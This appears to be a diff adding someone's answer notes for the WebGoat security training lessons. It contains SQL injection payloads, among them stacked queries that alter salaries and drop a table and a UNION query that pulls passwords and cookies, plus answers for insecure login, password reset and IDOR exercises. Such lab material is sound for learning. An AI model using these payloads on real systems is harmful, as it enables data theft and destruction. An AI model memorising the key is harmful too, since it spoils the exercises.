@@ -1,0 +1,75 @@
+cd C:\webgoat
+& "C:\Program Files\Java\jdk-22\bin\java.exe" -jar webgoat-2023.8.jar
+
+INTRO:
+
+2:
+SELECT * FROM employees WHERE first_name='Bob'
+
+3:
+UPDATE employees SET department='Sales' WHERE first_name='Tobi'
+
+4:
+ALTER TABLE employees ADD phone varchar(20)
+
+5:
+GRANT ALL ON grant_rights TO unauthorized_user;
+
+9:
+' OR '1'='1
+
+10:
+1
+'1' OR '1'='1'
+
+11:
+Smith
+3SL99A' OR '1'='1
+
+12:
+'; UPDATE employees SET salary='10000000' WHERE auth_tan='3SL99A'; --
+
+13:
+'; DROP TABLE access_log; --
+
+-------------------------------------
+
+ADVANCED:
+
+3:
+
+6.a):
+'; SELECT * FROM user_system_data;--
+arba
+' UNION SELECT NULL, user_name, password, cookie, NULL, NULL, NULL from user_system_data;--
+
+6.b):
+passW0rD
+
+--------------------------------------------------------------------------
+
+(A7) -> Insecure Login:
+
+2:
+CaptainJack
+BlackPearl
+
+(A7) -> Password reset:
+
+4:
+Username: tom, Color: purple
+Username: admin, Color: green
+Username: larry, Color: yellow
+
+
+(A1) -> Insecure Direct Object References:
+
+3:
+role,userId
+
+4:
+WebGoat/IDOR/profile/2342384
+
+5:
+userId: 2342388
+{'lessonCompleted': True, 'feedback': "Well done, you found someone else's profile", 'output': '{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}', 'assignment': 'IDORViewOtherProfile', 'attemptWasMade': True}
